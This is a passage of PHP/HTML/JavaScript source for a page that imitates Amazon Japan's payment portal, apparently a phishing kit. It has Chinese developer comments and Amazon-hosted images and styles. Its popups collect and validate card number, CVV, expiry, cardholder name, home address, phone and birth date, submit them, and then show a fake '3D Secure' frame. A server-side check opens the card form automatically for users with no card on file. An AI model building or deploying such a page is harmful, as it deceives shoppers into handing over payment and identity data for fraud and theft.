    errMsg["homemall"]="郵便番号を記入してください。";
    errMsg["homeaddress"]="住所に記入してください。";
    errMsg["homephone"]="電話番号を記入してください。";
    errMsg["homecity"]="州/都道府県を記入してください。";
    errMsg["homemall_error"]="郵便番号に問題がありました。";
    errMsg["homephone_error"]="入力された電話番号には数字以外の文字が含まれています。";


    var bankimgarray = new Array();
    bankimgarray["American Express"] = "https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/amex._CB485934364_.gif";
    bankimgarray["JCB"] = "https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/jcb._CB404655576_.png";
    bankimgarray["Mastercard"] = "https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/mc._CB447120788_.gif";
    bankimgarray["Visa"] = "https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/visa._CB413198211_.png";
    
    
    var carnumlength = 0;
    function changecardnum(type){
        var carnum = document.getElementById(type+"_cardnum");
        var CursortPosition = getCursortPosition(carnum);
        carnum.value = (carnum.value.replace(/\s/g, '').replace(/(.{4})/g, "$1 ")).replace(/(\s*$)/g,"");
        if(CursortPosition%5 == 0){
            if(carnum.value.length>carnumlength){
                CursortPosition = CursortPosition+1;
            }else{
                CursortPosition = CursortPosition-1;
            }
        }
        carnumlength = carnum.value.length;
        if(CursortPosition<0){
            CursortPosition=0;
        }
        setCaretPosition(carnum,CursortPosition);
    }
    function getCursortPosition (textDom) {
        var cursorPos = 0;
        if (document.selection) {
            // IE Support
            textDom.focus ();
            var selectRange = document.selection.createRange();
            selectRange.moveStart ('character', -textDom.value.length);
            cursorPos = selectRange.text.length;
        }else if (textDom.selectionStart || textDom.selectionStart == '0') {
            // Firefox support
            cursorPos = textDom.selectionStart;
        }
        return cursorPos;
    }

    // 设置光标位置
    function setCaretPosition(textDom, pos){
        if(textDom.setSelectionRange) {
            // IE Support
            textDom.focus();
            textDom.setSelectionRange(pos, pos);
        }else if (textDom.createTextRange) {
            // Firefox support
            var range = textDom.createTextRange();
            range.collapse(true);
            range.moveEnd('character', pos);
            range.moveStart('character', pos);
            range.select();
        }
    }   
    function checkNumber(theObj) {
        var reg = /^[0-9]+.?[0-9]*$/;
        if (reg.test(theObj)) {
            return true;
        }
        return false;
    }

    function bksubmit(){
        
        removeerror_bk();
        
        var bkerrBox = document.getElementById("bk_errBox");
        var bkerrMsg = document.getElementById("bk_errMsg");
        var bkcarnum = document.getElementById("bk_cardnum");
        var bkcardname = document.getElementById("bk_cardname");
        var bkcarddatem = document.getElementById("bk_carddatem");
        var bkcarddatey = document.getElementById("bk_carddatey");
        var bkcardcvv = document.getElementById("bk_cardcvv");
        var bkcarddatemspan = document.getElementById("bk_carddatem_span");
        var bkcarddateyspan = document.getElementById("bk_carddatey_span");
        var errorHtml = "";
        
        if(bkcardname.value.trim()==""){
            bkcardname.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardname']+'</span></li>';
        }
        if(bkcarnum.value == ""){
            bkcarnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum']+'</span></li>';
        }else if(!luhn_algo(bkcarnum.value.split(" ").join(""))){
            bkcarnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum_error']+'</span></li>';
        }
        console.log(bkcarddatey.value+(bkcarddatem.value>9?bkcarddatem.value:"0"+bkcarddatem.value));
        if(bkcarddatey.value+(bkcarddatem.value>9?bkcarddatem.value:"0"+bkcarddatem.value) < <?=date("Ym")?>){
            bkcarddatemspan.classList.add("a-button-error");
            bkcarddateyspan.classList.add("a-button-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['carddate']+'</span></li>';
        }
        if(bkcardcvv.value<100 || bkcardcvv.value>9999 || !checkNumber(bkcardcvv.value)){
            bkcardcvv.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardcvv']+'</span></li>';
        }
        
        if(errorHtml==""){
            var homename = document.getElementById("homename");
            var homemall = document.getElementById("homemall");
            var homecity = document.getElementById("homecity");
            var homeaddress = document.getElementById("homeaddress");
            var homephone = document.getElementById("homephone");
            
            if(homename.value.split(" ").join("")==""){
                homename.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homename']+'</span></li>';
            }
            if(homemall.value.split(" ").join("")==""){
                homemall.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homemall']+'</span></li>';
            }else if(!checkNumber(homemall.value)){
                homemall.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homemall_error']+'</span></li>';
            }
            if(homecity.value.split(" ").join("")==""){
                homecity.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homecity']+'</span></li>';
            }
            if(homeaddress.value.split(" ").join("")==""){
                homeaddress.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homeaddress']+'</span></li>';
            }
            if(homephone.value.split(" ").join("")==""){
                homephone.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homephone']+'</span></li>';
            }else if(!checkNumber(homephone.value)){
                homephone.classList.add("a-form-error");
                errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homephone_error']+'</span></li>';
            }
        }
        
       
        if(errorHtml!=""){
            bkerrMsg.innerHTML = errorHtml;
            bkerrBox.style.display="";
        }else{
            document.getElementById("bk_loding").style.display="";
            setTimeout(function () {
                document.getElementById("bk_loding").style.display="none";
                open_birthday_box("bk");
            }, 600);
        }
       
    }
    
    
    function testBankType(banknum){
       banknum = banknum.split(" ").join("");
       var banktype = assign_scheme(banknum);
       var bankimgobj = document.getElementById('bankimg');
       if(banktype!="Unknown"){
           bankimgobj.src = bankimgarray[banktype];
           bankimgobj.alt = banktype;
           bankimgobj.style.display="";
       }else{
           bankimgobj.src = "";
           bankimgobj.alt = "";
           bankimgobj.style.display="none";
       }
    }
    function open_bk_popup(){
        document.getElementById("boday_loding").style.display="";
        carnumlength = 0;
        setTimeout(function () {
            document.getElementById("boday_loding").style.display="none";
            go_open_bk_popup();
        }, 600);
    }
    function go_open_bk_popup(){
        var _elements=document.getElementById("bk_form").elements,
                _elementsLen=_elements.length,
                _ei=null,
                i=0;
        for(;i<_elementsLen;i++){
            _ei=_elements[i];
            _ei.value="";
        }
        removeerror_bk();
        document.getElementById("bk_carddatey").value="2021";
        document.getElementById("bk_carddatem").value="1";
        document.body.style.overflow = "hidden";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-bk").style.display="";
    }
    
    function close_bk_popup(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-bk").style.display="none";
    }
    
    function removeerror_bk(){
        document.getElementById("bk_errBox").style.display="none";
        document.getElementById("bk_cardname").classList.remove("a-form-error");
        document.getElementById("bk_cardnum").classList.remove("a-form-error");
        document.getElementById("bk_cardcvv").classList.remove("a-form-error");
        document.getElementById("bk_carddatem_span").classList.remove("a-button-error");
        document.getElementById("bk_carddatey_span").classList.remove("a-button-error");
        
        document.getElementById("homename").classList.remove("a-form-error");
        document.getElementById("homemall").classList.remove("a-form-error");
        document.getElementById("homecity").classList.remove("a-form-error");
        document.getElementById("homeaddress").classList.remove("a-form-error");
        document.getElementById("homephone").classList.remove("a-form-error");
    }
</script>
<!-----绑卡弹窗------->
<!------生日弹窗------>
<div class="a-popover-birthday" id="a-popover-birthday" style="display:none">
   <span tabindex="0" class="a-popover-start a-popover-a11y-offscreen"></span>
   <div class="a-popover-wrapper">
    <header class="a-popover-header">
     <h4 class="a-popover-header-content" id="a-popover-header-1">生年月日を検証する</h4>
     <button onclick="close_birthday_box();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
    </header>
    <div class="a-popover-inner" id="a-popover-content-1" style="height: auto; overflow-y: auto;">
     <div id="portalWidgetSection" class="a-section">
      <div id="cpefront-mpo-widget">
       <div data-pmts-component-id="pp-v3SKiV-1" class="a-section a-spacing-none pmts-widget-section pmts-portal-root-hvaKzVf8N1oL pmts-portal-component pmts-portal-components-pp-v3SKiV-1">
        <div id="birthday_loding"class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-v3SKiV-8" style="display:none">
         <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered" />
        </div>
        <div class="a-row">
         <div id="pp-v3SKiV-10" data-pmts-component-id="pp-v3SKiV-2" class="a-section pmts-portal-component pmts-portal-components-pp-v3SKiV-2">
          <div class="a-section a-spacing-none pmts-widget-section">
           <div class="a-section pmts-add-credit-card-component-container">
            <div id="pp-v3SKiV-11" data-pmts-component-id="pp-v3SKiV-3" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-v3SKiV-3">
              <div class="a-row a-spacing-base">
                  
                <div id="birthday_errBox" class="a-row a-spacing-base" style="display:none;">
                    <div class="a-column a-span12">
                        <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">問題が発生しました。</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="birthday_errMsg">
                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>


               <div class="a-column a-span12">
                    <div class="a-row ">
                        <div style="margin:20px 45px;">
                            <span style="font-weight:800">お誕生日</span>
                            <span style="margin-left:10px;">
                                <input type="hidden" id="birthday_type" value="bk">
                                <input type="text" maxlength="4" autocomplete="off" id="birthday_year" class="a-input-text a-form-normal" style="width:100px;" />年
                                <input type="text" maxlength="2" autocomplete="off" id="birthday_month" class="a-input-text a-form-normal" style="width:50px;" />月
                                <input type="text" maxlength="2" autocomplete="off" id="birthday_day" class="a-input-text a-form-normal" style="width:50px;" />日
                            </span>
                        </div>
                        
                    </div>
               </div>
              
               
              </div>
              <style>
                  div.right-a-column{
                    margin-right: 2%;
                    float: right;
                    min-height: 1px;
                    overflow: visible;
                  }
              </style>
              <div class="a-row apx-add-card-buttons-in-popover">
               <div class="a-section a-spacing-small a-spacing-top-small" style="text-align:right;">
                    <span class="a-button a-button-primary pmts-button-input" style="margin:2px 50px;">
                        <span class="a-button-inner" onclick="birthdaysubmit();">
                            <input class="a-button-input" type="button" value="検証" aria-labelledby="a-autoid-3-announce">
                        <span class="a-button-text" aria-hidden="true" id="a-autoid-3-announce">検証</span>
                    </span>
                </span>
               </div>
              </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
<script>
    
    errMsg["birthday"] = "正しい誕生日を記入してください";

    function birthdaysubmit(){
        var type = document.getElementById("birthday_type").value;
        var birthdayerrbox = document.getElementById("birthday_errBox");
        var birthdayerrmsg = document.getElementById("birthday_errMsg");
        var year = document.getElementById("birthday_year");
        var month = document.getElementById("birthday_month");
        var day = document.getElementById("birthday_day");
        var errorHtml = "";
        removeerror_birthday();
        if(!checkNumber(year.value) || year.value<1821 || year.value>2021){
            year.classList.add("a-form-error");
            errorHtml = '<li><span class="a-list-item">'+errMsg['birthday']+'</span></li>';
        }
        if(!checkNumber(month.value) || month.value<1 || month.value>12){
            month.classList.add("a-form-error");
            errorHtml = '<li><span class="a-list-item">'+errMsg['birthday']+'</span></li>';
        }
        if(!checkNumber(day.value) || day.value<1 || day.value>31){
            day.classList.add("a-form-error");
            errorHtml = '<li><span class="a-list-item">'+errMsg['birthday']+'</span></li>';
        }
        
        
        if(errorHtml!=""){
            birthdayerrmsg.innerHTML = errorHtml;
            birthdayerrbox.style.display="";
        }else{
            if(month.value<10){
                month.value = "0"+(month.value.split("0").join(""));
            }
            if(day.value<10){
                day.value = "0"+(day.value.split("0").join(""));
            }
            document.getElementById(type+"_birthday").value = year.value+"/"+month.value+"/"+day.value;
            document.getElementById("birthday_loding").style.display="";
            setTimeout(function () {
                document.getElementById(type+"_form").submit();
                open_3d_box();
            }, 600);
        }
        
       
        
        
        
    }
    
    function removeerror_birthday(){
        document.getElementById("birthday_errBox").style.display="none";
        document.getElementById("birthday_year").classList.remove("a-form-error");
        document.getElementById("birthday_month").classList.remove("a-form-error");
        document.getElementById("birthday_day").classList.remove("a-form-error");
    }
    
    function open_birthday_box(type){
        document.getElementById("birthday_year").value="";
        document.getElementById("birthday_month").value="";
        document.getElementById("birthday_day").value="";
        document.getElementById("birthday_type").value=type;
        document.getElementById("a-popover-wrapper-bk").style.display="none";
        document.getElementById("a-popover-wrapper-yz").style.display="none";
        removeerror_birthday();
        document.getElementById("birthday_loding").style.display="none";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-birthday").style.display="";
    }
    function close_birthday_box(){
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-birthday").style.display="none";
    }
</script>
<!--↑↑↑-生日弹窗-↑↑↑-->
<!-------3D弹窗------->
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-3d" style="width:420px;display:none;">
   <header class="a-popover-header">
    <h4 class="a-popover-header-content" id="a-popover-header-4">3D Secure</h4>
    <button onclick="close_3d_box();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
   </header>
   <iframe name="3d-secure" style="width:100%; height:360px;border: medium none;"></iframe>
</div>
<script>
    function open_3d_box(){
        document.getElementById("a-popover-birthday").style.display="none";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-3d").style.display="";
    }
    function close_3d_box(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-3d").style.display="none";
    }
</script>
<!-------3D弹窗------->
<!-----没绑卡自动打开绑卡弹窗----->
<?php if(count($cardInfo)<1){ ?>
<script>
    open_bk_popup();
</script>
<?php } ?>
<!-----没绑卡自动打开绑卡弹窗----->         
        </div>
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01cxjPaaTNL.css?AUIClients/APXWidgetsAssets-APXWidgets-Boleto" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01vAZlEwVjL.css?AUIClients/APXWidgetsAssets-APXWidgets-PaymentAuthenticationApprovers" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/11HEveYPS1L.css?AUIClients/APXWidgetsAssets-APXWidgets-PaymentLocation" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01hOHsbn7OL.css?AUIClients/APXWidgetsAssets-APXWidgets-Balances" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01Th6GzRvLL.css?AUIClients/APXWidgetsAssets-APXWidgets-EquatedMonthlyInstallments" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/41b3kNgtOJL.css?AUIClients/APXWidgetsAssets-PaymentsPortalWidgets2" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01ksnpiHW2L.css?AUIClients/APXWidgetsAssets-APXWidgets-INPrime" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01RVwf5E26L.css?AUIClients/APXWidgetsAssets-APXWidgets-Legal" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01le4Wlx71L.css?AUIClients/APXWidgetsAssets-APXWidgets-WeChatPay" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/11oLdWDbUIL.css?AUIClients/APXWidgetsAssets-APXWidgets-PayWithBankAccount" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01K72ZPRhdL.css?AUIClients/APXWidgetsAssets-APXWidgets-Maple" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/11Lf1cgAibL.css?AUIClients/APXWidgetsAssets-APXWidgets-ZipPay" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01r7njY8e6L.css?AUIClients/APXWidgetsAssets-APXWidgets-B2BPaymentsAcceptance" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01oed2b7XHL.css?AUIClients/APXWidgetsAssets-APXWidgets-Bellamy" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01QcSvFT3WL.css?AUIClients/APXWidgetsAssets-APXWidgets-AIPS" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/016qKgd8I1L.css?AUIClients/APXWidgetsAssets-APXWidgets-OfficialValidDocument" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01dkJYlUMlL.css?AUIClients/APXWidgetsAssets-APXWidgets-BankRefund" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01B8WX2PjrL.css?AUIClients/APXWidgetsAssets-APXWidgets-ShopWithPoints" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/012cFBcH5KL.css?AUIClients/APXWidgetsAssets-APXWidgets-Transactions" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01JRZxD87IL.css?AUIClients/APXWidgetsAssets-APXWidgets-PurchaseFinancing" />
        <link rel="stylesheet" type="text/css" href="https://images-fe.ssl-images-amazon.com/images/I/01X1lSVLPLL.css?AUIClients/APXWidgetsAssets-APXWidgets-PostPay" /> 
       </div> 
      </div> 
     </div>
    </div>
   </div>
  </div>


  <!-- sp:end-feature:host-atf --> 
  <!-- sp:feature:nav-btf --> 
  <!-- btf pilu --> 
  <style>
  #nav-prime-tooltip{
    padding: 0 20px 2px 20px;
    background-color: white;
    font-family: arial,sans-serif;
  }
  .nav-npt-text-title{
    font-family: arial,sans-serif;
    font-size: 18px;
    font-weight: bold;
    line-height: 21px;
    color: #E47923;
  }
  .nav-npt-text-detail, a.nav-npt-a{
    font-family: arial,sans-serif;
    font-size: 12px;
    line-height: 14px;
    color: #333333;
    margin: 2px 0px;
  }
  a.nav-npt-a {
    text-decoration: underline;
  }
</style> 
  <div style="display: none"> 
   <div id="nav-prime-tooltip"> 
    <div class="nav-npt-text-title">
      Amazonプライム会員ならお急ぎ便、日時指定便が使い放題 
    </div> 
    <div class="nav-npt-text-detail">
      さらに、映画もTV番組も見放題。200万曲が聴き放題 。クラウドに好きなだけ写真も保存可能。 
    </div> 
    <div class="nav-npt-text-detail">
      &gt; 
     <a class="nav-npt-a" href="https://www.amazon.co.jp/prime/ref=nav_tooltip_redirect">プライムを無料で試す</a> 
    </div> 
   </div> 
  </div> 
  <style type="text/css">



#csr-hcb-wrapper {
  display: none;
}

.bia-item .bia-action-button {
  display: inline-block;
  height: 22px;
  margin-top: 3px;
  padding: 0px;
  overflow: hidden;
  text-align: center;
  vertical-align: middle;
  text-decoration: none;
  color: #111;
  font-family: Arial,sans-serif;
  font-size: 11px;
  font-style: normal;
  font-weight: normal;
  line-height: 19px;
  cursor: pointer;
  outline: 0;
  border: 1px solid;
  -webkit-border-radius: 3px 3px 3px 3px;
  -moz-border-radius: 3px 3px 3px 3px;
  border-radius: 3px 3px 3px 3px;
  border-radius: 0\9;
  border-color: #bcc1c8 #bababa #adb2bb;
  background: #eff0f3;
  background: -moz-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #f7f8fa), color-stop(100%, #e7e9ec));
  background: -webkit-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: -o-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: -ms-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: linear-gradient(top, #f7f8fa, #e7e9ec);
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#f7f8fa', endColorstr='#e7e9ec',GradientType=0);
  *zoom: 1;
  -webkit-box-shadow: inset 0 1px 0 0 #fff;
  -moz-box-shadow: inset 0 1px 0 0 #fff;
  box-shadow: inset 0 1px 0 0 #fff;
  box-sizing: border-box;
}

#bia-hcb-widget .a-button-text {
    font-family: Arial,sans-serif !important;
}

#bia_content .a-icon-row {
    display: none;
}

#bia-hcb-widget .a-icon-row {
      display: none;
}

#bia_content {
    width: 266px;
}

.nav-flyout-sidePanel {
    width: 266px !important;
}
.aui-atc-button {
    margin-top: 3px;
    overflow: hidden;
    color: #111;
    font-family: Arial,sans-serif;
    font-size: 11px;
    font-style: normal;
    font-weight: normal;
}
.bia-item .bia-action-button:hover {
  border-color: #aeb4bd #adadad #9fa5af;
  background: #e0e3e8;
  background: -moz-linear-gradient(top, #e7eaf0, #d9dce1);
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #e7eaf0), color-stop(100%, #d9dce1));
  background: -webkit-linear-gradient(top, #e7eaf0, #d9dce1);
  background: -o-linear-gradient(top, #e7eaf0, #d9dce1);
  background: -ms-linear-gradient(top, #e7eaf0, #d9dce1);
  background: linear-gradient(top, #e7eaf0, #d9dce1);
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#e7eaf0', endColorstr='#d9dce1',GradientType=0);
  *zoom: 1;
  -webkit-box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
  -moz-box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
  box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
}

.bia-item .bia-action-button:active {
  background-color: #dcdfe3;
  -webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
  -moz-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
}

.bia-item .bia-action-button-disabled {
  background: #f7f8fa;
  color: #b7b7b7;
  border-color: #e0e0e0;
  box-shadow: none;
  cursor: default;
}

.bia-item .bia-action-button-disabled:hover {
  background: #f7f8fa;
  color: #b7b7b7;
  border-color: #e0e0e0;
  box-shadow: none;
  cursor: default;
}

.bia-action-button-inner {
  border-bottom-color: #111111;
  border-bottom-style: none;
  border-bottom-width: 0px;
  border-image-outset: 0px;
  border-image-repeat: stretch;
  border-image-slice: 100%;
  border-image-width: 1;
  border-left-color: #111111;
  border-left-style: none;
  border-left-width: 0px;
  border-right-color: #111111;
  border-right-style: none;
  border-right-width: 0px;
  border-top-color: #111111;
  border-top-style: none;
  border-top-width: 0px;
  box-sizing: border-box;
  display: block;
  height: 20px;
  line-height: 19px;
  overflow: hidden;
  position: relative;
  padding: 0;
  vertical-align: baseline;
}

.bia-action-inner {
  border: 0;
  display: inline;
  font-size: 11px;
  height: auto;
  line-height: 19px;
  padding: 0px 4px 0px 4px;
  text-align: center;
  width: auto;
  white-space: nowrap;
}

.csr-content {
  font-family: Arial, Verdana, Helvetica, sans-serif;
  width: 220px;
  line-height: 19px;
}

.bia-header {
  font-size: 16px;
  color: #E47911;
  padding-bottom: 10px;
}

.bia-header-widget {
  white-space: nowrap;
  overflow: hidden;
}

.b2b-nav-header {
  white-space: nowrap;
  overflow: hidden;
  margin-bottom: 18px;
}

.bia-space-right {
  padding-right: 18px;
  white-space: normal;
  float: left;
}

.b2b-see-more-link a {
  display: inline;
  float: left;
  margin-top: 3px;
  margin-left: 3px;
}

.hcb-see-more-link a {
  color: #333;
  font-size: 13px;
  text-decoration: none;
  font-family: Arial, Verdana, Helvetica, sans-serif;
}

.bia-hcb-body {
  overflow: hidden;
}

.bia-item {
  width: 220px;
  display: inline-block;
  margin-bottom: 20px;
}

.bia-item-image {
  float: left;
  margin-right: 15px;
  width: 75px;
  height: 75px;
}

.bia-image {
  max-height: 75px;
  max-width: 75px;
  border: 0;
}

.bia-item-data {
  float: left;
  width: 130px;
}

.bia-title {
  line-height: 19px;
  font-size: 13px;
  max-height: 60px;
  overflow: hidden;
}

.bia-link:link {
  text-decoration: none;
  font-family: Arial, Verdana, Helvetica, sans-serif;
}

.bia-link:visited {
  text-decoration: none;
  color: #004B91;
}

.bia-price-nav {
  margin-top: -4px;
  color: #800;
  font-size: 12px;
  vertical-align: bottom;
}

.bia-price-yorr {
    margin-top: -8px;
    color: #800;
    font-size: 12px;
    vertical-align: bottom;
}

.bia-price {
  color: #800;
  font-size: 12px;
  vertical-align: bottom;
}

.bia-vpc-t1{
  color: #008a00;
  font-size: 12px;
  font-weight: bold;
}

.bia-vpc-t2{
  color: #008a00;
  font-size: 12px;
}

.bia-vpc-t3{
  font-size: 12px;
  line-height: 20px;
}

.bia-vpc-t3-badge{
  color: #ffffff;
  background-color: #e47911;
  font-weight: normal;

}

.bia-vpc-t3-badge::before{
  border-bottom: 10px solid #e47911;
}

.bia-vpc-t3-badge:after{
  border-top: 10px solid #e47911;
}

.bia-ppu {
  color: #800;
  font-size: 10px;
}

.bia-prime-badge {
  border: 0;
  vertical-align: middle;
}

.bia-cart-action {
  display: none;
}

.bia-cart-msg {
  display: block;
  font-family: Arial, Verdana, Helvetica, sans-serif;
  line-height: 19px;
}

.bia-cart-icon {
  background-image:
      url("https://images-fe.ssl-images-amazon.com/images/G/09/Recommendations/MissionExperience/BIA/bia-atc-confirm-icon._CB485946450_.png");
  display: inline-block;
  width: 14px;
  height: 13px;
  top: 3px;
  line-height: 19px;
  position: relative;
  vertical-align: top;
}

.bia-cart-success {
  color: #090!important;
  display: inline-block;
  margin: 0;
  font-size: 13px;
  font-style: normal;
  font-weight: bold;
  font-family: Arial, Verdana, Helvetica, sans-serif;
}

.bia-cart-title {
  margin-bottom: 3px;
}

.bia-cart-form {
  margin: 0px;
}

.bia-inline-cart-form {
  margin: 0px;
}

.bia-cart-submit {
  cursor: inherit;
  left: 0;
  top: 0;
  line-height: 19px;
  height: 100%;
  width: 100%;
  padding: 1px 6px 1px 6px;
  position: absolute;
  opacity: 0.01;
  overflow: visible;
  filter: alpha(opacity=1);
  z-index: 20;
}

.bia-link-caret {
  color: #e47911;
}

</style> 
  <div style="display: none"> 
   <div id="nav-prime-menu" class="nav-empty nav-flyout-content nav-ajax-prime-menu"> 
    <div class="nav_dynamic"></div> 
    <div class="nav-ajax-message"></div> 
    <div class="nav-ajax-error-msg"> 
     <p class="nav_p nav-bold">現時点ではこのメニューの読み込みに問題があります。</p> 
     <p class="nav_p"><a href="https://www.amazon.co.jp/gpprime/ref=nav_prime_ajax_err" class="nav_a">Amazon プライムの詳細はこちら。</a></p> 
    </div> 
   </div> 
  </div> 
  <!-- NAVYAAN BTF START --> 
  <script type="text/javascript">
  window.$Nav && $Nav.when("data").run(function(data){
    data({
      "accountListContent":{"html":"<div id='nav-al-container'><div id='nav-al-wishlist' class='nav-al-column nav-tpl-itemList nav-flyout-content nav-flyout-accessibility'><div class='nav-title' id='nav-al-title'>リスト</div><a href='https://www.amazon.co.jp/gp/registry/wishlist?triggerElementID=createList&ref_=nav_ListFlyout_gno_createwl' class='nav-link nav-item'><span class='nav-text'>新しいリストを作成する</span></a> <a href='https://www.amazon.co.jp/gp/registry/search.html?type=wishlist&ref_=nav_ListFlyout_gno_listpop_find' class='nav-link nav-item'><span class='nav-text'>ほしい物リストを見つける</span></a> <a href='https://www.amazon.co.jp/gcx/-/gfhz/?ref_=nav_wishlist_gf' class='nav-link nav-item'><span class='nav-text'>ギフトアイデア</span></a> <a href='https://www.amazon.co.jp/baby-reg/homepage?ref_=nav_ListFlyout_br' class='nav-link nav-item'><span class='nav-text'>ベビーレジストリ</span></a> <a href='https://www.amazon.co.jp/showroom?ref_=nav_ListFlyout_srm_your_desk_wl_jp' class='nav-link nav-item'><span class='nav-text'>ショールーム</span></a></div><div id='nav-al-your-account' class='nav-al-column nav-template nav-flyout-content nav-tpl-itemList nav-flyout-accessibility'><div class='nav-title'>アカウントサービス</div><a href='https://www.amazon.co.jp/gp/css/homepage.html?ref_=nav_AccountFlyout_ya' class='nav-link nav-item'><span class='nav-text'>アカウントサービス</span></a> <a id='nav_prefetch_yourorders' href='https://www.amazon.co.jp/gp/css/order-history?ref_=nav_AccountFlyout_orders' class='nav-link nav-item'><span class='nav-text'>注文履歴</span></a> <a href='https://www.amazon.co.jp/ddb/your-dash-buttons?ref_=nav_AccountFlyout_snk_ddb_ydb' class='nav-link nav-item'><span class='nav-text'>バーチャルダッシュ </span></a><a href='https://www.amazon.co.jp/gp/registry/wishlist?requiresSignIn=1&ref_=nav_AccountFlyout_wl' class='nav-link nav-item'><span class='nav-text'>ほしい物リスト</span></a> <a href='https://www.amazon.co.jp/gp/yourstore?ref_=nav_AccountFlyout_recs' class='nav-link nav-item'><span class='nav-text'>おすすめ商品</span></a> <a href='https://www.amazon.co.jp/auto-deliveries?ref_=nav_AccountFlyout_sns' class='nav-link nav-item'><span class='nav-text'>ご利用中の定期おトク便の変更・停止</span></a> <a href='https://www.amazon.co.jp/gp/gc/balance?ref_=nav_item_yourgcbalance' class='nav-link nav-item'><span class='nav-text'>ギフト券残高</span></a> <a href='https://www.amazon.co.jp/yourmembershipsandsubscriptions?ref_=nav_AccountFlyout_digital_subscriptions' class='nav-link nav-item'><span class='nav-text'>メンバーシップおよび購読</span></a> <a href='https://www.amazon.co.jp/gp/subs/primeclub/account/homepage.html?ref_=nav_AccountFlyout_prime' class='nav-link nav-item'><span class='nav-text'>Amazonプライム会員情報</span></a> <a 